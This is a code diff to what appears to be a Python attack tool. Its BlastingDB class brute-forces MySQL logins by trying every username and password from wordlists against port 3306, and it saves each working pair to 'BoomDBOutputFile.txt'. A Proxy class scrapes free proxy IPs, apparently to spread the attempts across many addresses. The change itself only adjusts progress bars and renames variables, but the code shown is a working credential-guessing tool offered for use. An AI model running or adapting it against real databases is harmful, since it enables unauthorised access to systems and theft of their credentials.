@@ -92,19 +92,18 @@ class BlastingDB:
         try:
             if self.DataBaseUserFileName!=None and self.DataBasePasswrodFileName!=None:
                 with open(self.DataBaseUserFileName, encoding='utf-8') as f:
-                    print("DatabaseBlastingProgress:")
-                    for UserLine in tqdm(f):
+                    for UserLine in tqdm(f,ascii=True,desc="DatabaseBlastingProgress:"):
                         User = UserLine
-                        with open(self.DataBasePasswrodFileName, encoding='utf-8') as f:
-                            for PassWrodLine in f:
+                        with open(self.DataBasePasswrodFileName, encoding='utf-8') as fp:
+                            for PassWrodLine in tqdm(fp,desc="Single user password progress",ascii=True):
                                 PassWrod = PassWrodLine
                                 try:
                                     Url=IpProcess(Url)
                                     conn = pymysql.connect(Url, User, PassWrod, 'mysql', 3306)
                                     conn.close()
                                     BoomDBFileName = "BoomDBOutputFile.txt"
-                                    with open(BoomDBFileName, 'a', encoding='utf-8') as f:
-                                        f.write("Database address:"+Url +"      Account:"+User+"      Passwrod:"+PassWrod+ "\n")  # 写入单独的扫描结果文件中
+                                    with open(BoomDBFileName, 'a', encoding='utf-8') as fg:
+                                        fg.write("Database address:"+Url +"      Account:"+User+"      Passwrod:"+PassWrod+ "\n")  # 写入单独的扫描结果文件中
                                 except Exception as e:
                                     pass
         except IOError:
@@ -112,19 +111,18 @@ class BlastingDB:
         try:
             if self.DataBaseUserFileName == None or self.DataBasePasswrodFileName==None:
                 with open("/Dictionary/MysqlUser.txt", encoding='utf-8') as f:#打开默认的User文件
-                    print("DatabaseBlastingProgress:")
-                    for UserLine in tqdm(f):
+                    for UserLine in tqdm(f,ascii=True,desc="Total progress of the blasting database:"):
                         User = UserLine
-                        with open("/Dictionary/MysqlPasswrod.txt", encoding='utf-8') as f:#打开默认的密码文件
-                            for PassWrodLine in f:
+                        with open("/Dictionary/MysqlPasswrod.txt", encoding='utf-8') as fp:#打开默认的密码文件
+                            for PassWrodLine in tqdm(fp,desc="Single user password progress",ascii=True):
                                 PassWrod = PassWrodLine
                                 try:
                                     Url = IpProcess(Url)
                                     conn = pymysql.connect(Url, User, PassWrod, 'mysql', 3306)
                                     conn.close()
                                     BoomDBFileName = "BoomDBOutputFile.txt"
-                                    with open(BoomDBFileName, 'a', encoding='utf-8') as f:
-                                        f.write("Database address:"+Url +"      Account:"+User+"      Passwrod:"+PassWrod+ "\n")  # 写入单独的扫描结果文件中
+                                    with open(BoomDBFileName, 'a', encoding='utf-8') as fg:
+                                        fg.write("Database address:"+Url +"      Account:"+User+"      Passwrod:"+PassWrod+ "\n")  # 写入单独的扫描结果文件中
                                 except Exception as e:
                                     pass
         except IOError:
@@ -140,8 +138,7 @@ class Proxy:#IP代理池参数
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                           "Chrome/59.0.3071.115 Safari/537.36"}
-        print("ProxyPoolProgress:")
-        for i in tqdm(range(1, 5)):
+        for i in tqdm(range(1, 5),desc="ProxyPoolProgress:",ascii=True):
             HttpUrl = 'http://www.xicidaili.com/wt/{0}'.format(i)
             req = requests.get(url=HttpUrl, headers=headers,timeout=10)
             selector = Selector(text=req.text)
@@ -154,7 +151,7 @@ class Proxy:#IP代理池参数
                 #proxy_type = tr.xpath('td[6]/text()').extract()[0].lower()
                 HttpIpLists.append((HttpIp+':'+HttpPort))#存储到httpIP列表里面
 
-            for ip in HttpIpLists:
+            for ip in tqdm(HttpIpLists,ascii=True,desc="Cleaning page %s IP"%i):
                 #print(ip)
                 proxies = {
                     "http": "http://"+str(ip)#使用代理前面一定要加http://或者https://
